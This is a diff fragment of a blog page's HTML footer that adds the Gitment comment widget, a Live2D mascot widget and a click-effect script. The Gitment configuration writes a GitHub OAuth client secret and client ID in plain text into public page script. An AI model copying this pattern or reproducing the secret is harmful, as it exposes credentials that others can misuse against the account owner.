+        <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+        <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitment({
+            id: window.location.pathname, 
+            owner: '',
+            repo: '',
+            
+            oauth: {
+            
+            
+                client_secret: '77ab6a9abf0c36021f818b3ab4112447b8d99aab',
+            
+                client_id: 'ed36115102b8c7e52f62'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      renderGitment();
+      
+      </script>
+    
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/"});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
